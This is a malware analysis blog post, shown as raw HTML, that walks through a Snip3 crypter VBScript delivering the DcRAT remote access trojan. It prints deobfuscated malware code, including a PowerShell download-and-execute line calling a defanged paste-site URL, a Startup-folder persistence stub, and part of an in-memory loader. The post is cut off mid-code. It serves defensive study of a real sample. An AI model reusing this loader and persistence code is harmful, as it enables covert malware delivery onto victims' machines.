<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Snip3 Crypter used with DCRat via VBScript" /><meta property="og:locale" content="en" /><meta name="description" content="Adversaries love using free or cheap RATs or stealers, and I see a lot of RATs such as AsyncRAT during my daily malware analysis tasks. In this detection I want to examine a fairly recent sample from in MalwareBazaar that involves Snip3 crypter and DcRAT, an AsyncRAT clone. If you want to follow along at home, the sample is available here in MalwareBazaar: https://bazaar.abuse.ch/sample/78a742710aa79e0574a6faefecfaf851b64043889e75768f5de091cfc5a21dc0/." /><meta property="og:description" content="Adversaries love using free or cheap RATs or stealers, and I see a lot of RATs such as AsyncRAT during my daily malware analysis tasks. In this detection I want to examine a fairly recent sample from in MalwareBazaar that involves Snip3 crypter and DcRAT, an AsyncRAT clone. If you want to follow along at home, the sample is available here in MalwareBazaar: https://bazaar.abuse.ch/sample/78a742710aa79e0574a6faefecfaf851b64043889e75768f5de091cfc5a21dc0/." /><link rel="canonical" href="https://forensicitguy.github.io/snip3-crypter-dcrat-vbs/" /><meta property="og:url" content="https://forensicitguy.github.io/snip3-crypter-dcrat-vbs/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-16T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Snip3 Crypter used with DCRat via VBScript" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-04-16T00:00:00+00:00","datePublished":"2022-04-16T00:00:00+00:00","description":"Adversaries love using free or cheap RATs or stealers, and I see a lot of RATs such as AsyncRAT during my daily malware analysis tasks. In this detection I want to examine a fairly recent sample from in MalwareBazaar that involves Snip3 crypter and DcRAT, an AsyncRAT clone. If you want to follow along at home, the sample is available here in MalwareBazaar: https://bazaar.abuse.ch/sample/78a742710aa79e0574a6faefecfaf851b64043889e75768f5de091cfc5a21dc0/.","headline":"Snip3 Crypter used with DCRat via VBScript","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/snip3-crypter-dcrat-vbs/"},"url":"https://forensicitguy.github.io/snip3-crypter-dcrat-vbs/"}</script><title>Snip3 Crypter used with DCRat via VBScript | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/images/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tony Lambert</a></div><div class="site-subtitle font-italic">An educator that does security things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener"> <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener"> <i class="fab fa-mastodon"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Snip3 Crypter used with DCRat via VBScript</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Snip3 Crypter used with DCRat via VBScript</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1650067200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-16 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2904 words"> <em>16 min</em> read</span></div></div></div><div class="post-content"><p>Adversaries love using free or cheap RATs or stealers, and I see a lot of RATs such as AsyncRAT during my daily malware analysis tasks. In this detection I want to examine a fairly recent sample from in MalwareBazaar that involves Snip3 crypter and DcRAT, an AsyncRAT clone. If you want to follow along at home, the sample is available here in MalwareBazaar: <a href="https://bazaar.abuse.ch/sample/78a742710aa79e0574a6faefecfaf851b64043889e75768f5de091cfc5a21dc0/">https://bazaar.abuse.ch/sample/78a742710aa79e0574a6faefecfaf851b64043889e75768f5de091cfc5a21dc0/</a>.</p><h2 id="analyzing-the-first-stage"><span class="mr-2">Analyzing the first stage</span><a href="#analyzing-the-first-stage" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Jumping into the analysis of the first stage, we can see the code is VBScript. Some of the code includes <code class="language-plaintext highlighter-rouge">Dim</code> keywords, and that’s usually an easy way to tell. The grand majority of the code in the script is responsible for some form of obfuscation and the only real important parts are the <code class="language-plaintext highlighter-rouge">obj.Add</code>, which eventually translates into a <code class="language-plaintext highlighter-rouge">WScript.shell</code> call, and the <code class="language-plaintext highlighter-rouge">Camtasia</code> variable, which reduces down to PowerShell code after some text replacement.</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="k">Set</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Scripting.Dictionary"</span><span class="p">)</span>
<span class="n">obj</span><span class="p">.</span><span class="n">Add</span> <span class="s">"W"</span><span class="p">,</span> <span class="s">"Apple"</span>
<span class="n">obj</span><span class="p">.</span><span class="n">Add</span> <span class="s">"S"</span><span class="p">,</span> <span class="s">"Bluetooth"</span>
<span class="n">obj</span><span class="p">.</span><span class="n">Add</span> <span class="s">"c"</span><span class="p">,</span> <span class="s">"Clear"</span>
<span class="n">obj</span><span class="p">.</span><span class="n">Add</span> <span class="s">"r"</span><span class="p">,</span> <span class="s">"Orange"</span>
<span class="n">obj</span><span class="p">.</span><span class="n">Add</span> <span class="s">"i"</span><span class="p">,</span> <span class="s">"Application"</span>
<span class="n">obj</span><span class="p">.</span><span class="n">Add</span> <span class="s">"p"</span><span class="p">,</span> <span class="s">"Windows"</span>
<span class="n">obj</span><span class="p">.</span><span class="n">Add</span> <span class="s">"t"</span><span class="p">,</span> <span class="s">"Linux"</span>
<span class="n">obj</span><span class="p">.</span><span class="n">Add</span> <span class="s">"."</span><span class="p">,</span> <span class="s">"Ubuntu"</span>
<span class="n">obj</span><span class="p">.</span><span class="n">Add</span> <span class="s">"s"</span><span class="p">,</span> <span class="s">"Building"</span>
<span class="n">obj</span><span class="p">.</span><span class="n">Add</span> <span class="s">"h"</span><span class="p">,</span> <span class="s">"Car"</span>
<span class="n">obj</span><span class="p">.</span><span class="n">Add</span> <span class="s">"e"</span><span class="p">,</span> <span class="s">"Book"</span>
<span class="n">obj</span><span class="p">.</span><span class="n">Add</span> <span class="s">"l"</span><span class="p">,</span> <span class="s">"SmartPhone"</span>
<span class="n">obj</span><span class="p">.</span><span class="n">Add</span> <span class="s">"L"</span><span class="p">,</span> <span class="s">"Computer"</span>
<span class="k">Dim</span> <span class="nv">Keys</span><span class="p">,</span> <span class="n">WS</span>
<span class="n">Keys</span> <span class="o">=</span> <span class="n">obj</span><span class="p">.</span><span class="n">Keys</span>
<span class="k">For</span> <span class="k">Each</span> <span class="n">K</span> <span class="ow">In</span> <span class="n">Keys</span>
	<span class="n">WS</span> <span class="o">=</span> <span class="n">WS</span> <span class="o">&amp;</span> <span class="n">K</span>
<span class="k">Next</span>

<span class="k">Dim</span> <span class="nv">Camtasia</span>
<span class="n">Camtasia</span> <span class="o">=</span> <span class="s">"金Ｚ難月竹大中心口田手尸［；、/一山女弓人竹廿弓[金Ｚ難月竹大中心口田手尸［；、/一山女弓人竹廿弓S..."</span>
<span class="n">Camtasia</span> <span class="o">=</span> <span class="n">Replace</span><span class="p">(</span><span class="n">Camtasia</span><span class="p">,</span> <span class="s">"金Ｚ難月竹大中心口田手尸［；、/一山女弓人竹廿弓"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>

<span class="k">Set</span> <span class="n">Lenovo</span> <span class="o">=</span> <span class="n">GetObject</span><span class="p">(</span><span class="s">""</span><span class="p">,</span> <span class="n">WS</span><span class="p">)</span>
<span class="n">obj</span><span class="p">.</span><span class="n">RemoveAll</span><span class="p">()</span>

<span class="k">Dim</span> <span class="nv">Nvidia</span>
<span class="n">Nvidia</span> <span class="o">=</span> <span class="s">"PowerShell -ExecutionPolicy RemoteSigned -Command "</span>
<span class="n">Lenovo</span><span class="p">.</span><span class="n">Run</span> <span class="n">Nvidia</span> <span class="o">&amp;</span> <span class="n">Camtasia</span><span class="p">,</span> <span class="mi">0</span>
</pre></table></code></div></div><p>I’ve reduced the amount of code for brevity but in the full sample there is a large chunk of non-English Unicode characters that eventually get removed to produce this PowerShell code:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">System.Net.WebClient</span><span class="p">]</span><span class="w"> </span><span class="nv">$Client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.WebClient</span><span class="p">;</span><span class="w"> </span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$DownloadedData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$Client</span><span class="o">.</span><span class="nf">DownloadData</span><span class="p">(</span><span class="s1">'hxxps://textbin[.]net/raw/mevlbkxshp'</span><span class="p">);</span><span class="w"> </span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="w"> </span><span class="nv">$ByteToString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.UTF8Encoding</span><span class="p">]::</span><span class="n">UTF8.GetString</span><span class="p">(</span><span class="nv">$DownloadedData</span><span class="p">);</span><span class="w"> </span><span class="p">[</span><span class="n">System.IO.File</span><span class="p">]::</span><span class="n">WriteAllText</span><span class="p">(</span><span class="s1">'C:\Users\Public\mevlbkxshp.PS1'</span><span class="p">,</span><span class="w"> </span><span class="nv">$ByteToString</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">);</span><span class="w"> </span><span class="n">Invoke-Expression</span><span class="w"> </span><span class="s1">'PowerShell -ExecutionPolicy RemoteSigned -File C:\Users\Public\mevlbkxshp.PS1'</span><span class="w">
</span></pre></table></code></div></div><p>The PowerShell code is designed to download the next stage from <code class="language-plaintext highlighter-rouge">hxxps://textbin[.]net/raw/mevlbkxshp</code>, write the contents to disk as <code class="language-plaintext highlighter-rouge">mevlbkxshp.PS1</code> and then executing the script. It’s simple and straightforward with just the single purpose. The fun comes in the next stage!</p><h2 id="analyzing-the-second-stage"><span class="mr-2">Analyzing the second stage</span><a href="#analyzing-the-second-stage" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The second stage downloaded from <code class="language-plaintext highlighter-rouge">textbin[.]net</code> contains a lot of code that is encoded in decimal or URL encoding. The first part of the script contains</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">System.Windows.Forms</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">Microsoft.VisualBasic</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">Microsoft.CSharp</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">System.Management</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">System.Web</span><span class="w">

</span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$RUNPE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@(</span><span class="mi">31</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="err">...</span><span class="p">)</span><span class="w">

</span><span class="kr">Function</span><span class="w"> </span><span class="nf">INSTALL</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="w"> </span><span class="nv">$VBSRun</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Default.GetString</span><span class="p">(@(</span><span class="mi">83</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">98</span><span class="p">,</span><span class="mi">106</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">67</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">98</span><span class="p">,</span><span class="mi">106</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">87</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">98</span><span class="p">,</span><span class="mi">106</span><span class="p">,</span><span class="mi">46</span><span class="p">,</span><span class="mi">82</span><span class="p">,</span><span class="mi">117</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">119</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">69</span><span class="p">,</span><span class="mi">120</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">117</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">82</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">45</span><span class="p">,</span><span class="mi">70</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">70</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">44</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">48</span><span class="p">))</span><span class="w">
    </span><span class="p">[</span><span class="n">System.IO.File</span><span class="p">]::</span><span class="n">WriteAllText</span><span class="p">(([</span><span class="n">System.Environment</span><span class="p">]::</span><span class="n">GetFolderPath</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"\"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"MicroSoftOutlookLauncher.vbs"</span><span class="p">),</span><span class="w"> </span><span class="nv">$VBSRun</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s2">"%FilePath%"</span><span class="p">,</span><span class="w"> </span><span class="bp">$PSCommandPath</span><span class="p">))</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">Function</span><span class="w"> </span><span class="nf">Decompress</span><span class="w"> </span><span class="p">{</span><span class="w">
	</span><span class="p">[</span><span class="n">CmdletBinding</span><span class="p">()]</span><span class="w">
    </span><span class="kr">Param</span><span class="w"> </span><span class="p">(</span><span class="w">
		</span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="p">,</span><span class="n">ValueFromPipeline</span><span class="p">,</span><span class="n">ValueFromPipelineByPropertyName</span><span class="p">)]</span><span class="w">
        </span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$byteArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="kr">Throw</span><span class="p">(</span><span class="s2">"-byteArray is required"</span><span class="p">))</span><span class="w">
    </span><span class="p">)</span><span class="w">
	</span><span class="kr">Process</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="bp">$input</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IO.MemoryStream</span><span class="p">(</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="nv">$byteArray</span><span class="w"> </span><span class="p">)</span><span class="w">
	    </span><span class="nv">$output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IO.MemoryStream</span><span class="w">
        </span><span class="nv">$gzipStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IO.Compression.GzipStream</span><span class="w"> </span><span class="bp">$input</span><span class="p">,</span><span class="w"> </span><span class="p">([</span><span class="n">IO.Compression.CompressionMode</span><span class="p">]::</span><span class="n">Decompress</span><span class="p">)</span><span class="w">
	    </span><span class="nv">$gzipStream</span><span class="o">.</span><span class="nf">CopyTo</span><span class="p">(</span><span class="w"> </span><span class="nv">$output</span><span class="w"> </span><span class="p">)</span><span class="w">
        </span><span class="nv">$gzipStream</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
		</span><span class="bp">$input</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
		</span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$byteOutArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$output</span><span class="o">.</span><span class="nf">ToArray</span><span class="p">()</span><span class="w">
        </span><span class="kr">return</span><span class="w"> </span><span class="nv">$byteOutArray</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>This chunk of code defines some of the overhead boilerplate code involved with the Snip3 crypter. The <code class="language-plaintext highlighter-rouge">$RUNPE</code> variable contains decimal-encoded, gzip-compressed chunk of C# code. The <code class="language-plaintext highlighter-rouge">INSTALL()</code> function writes a bare minimum bit of code to disk to execute this downloaded code in the future. The <code class="language-plaintext highlighter-rouge">Decompress()</code> function inflates the compression on <code class="language-plaintext highlighter-rouge">$RUNPE</code> later down the line to make it usable. The second chunk of the script contains loads of additional boilerplate code from Snip3 designed to compile the RunPE code in memory, make the bare minimum of evidence on disk, and then load the generated RunPE assembly into memory.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="kr">function</span><span class="w"> </span><span class="nf">CodeDom</span><span class="p">([</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$BB</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="w"> </span><span class="nv">$TP</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="w"> </span><span class="nv">$MT</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="nv">$dictionary</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="s1">'System.Collections.Generic.Dictionary[[string],[string]]'</span><span class="w">
